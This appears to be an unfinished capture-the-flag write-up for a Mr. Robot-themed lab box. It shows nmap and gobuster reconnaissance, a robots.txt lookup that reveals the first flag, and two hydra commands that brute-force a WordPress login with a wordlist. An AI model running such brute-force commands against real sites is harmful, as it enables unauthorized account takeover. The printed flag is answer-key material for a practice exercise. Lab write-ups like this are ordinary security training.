# MrRobot
> Based on the Mr. Robot show, can you root this box?

## Key 1
* Ran nmap scan -- ports 80 and 443 are open
* Navigated to webpage
* Navigated to robots.txt:
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

fsocity.dic is a file containing credentials.

key-1-of-3.txt:
```
073403c8a58a1f80d943455fb30724b9
```

## Key 2


## Key 3

## Notes and Rabbitholes

Used gobuster to find hidden URIs

Used hydra to attempt to brute force Wordpress login page. Got syntax help from [this blog](http://insidetrust.blogspot.com/2011/08/using-hydra-to-dictionary-attack-web.html).

```
$ hydra -L fsocity.dic -P fsocity.dic 10.10.31.57 -s 80 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR" -o hydra-http-post-form-attack.txt
```

Tried hydra again with "root" as the username since it's on the website home page:
```
$ hydra -l root -P fsocity.dic 10.10.31.57 -s 80 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR" -o hydra-http-post-form-attack.txt
```

I ran a nmap scan on all ports to see if I was missing anything, but no new ports were found.
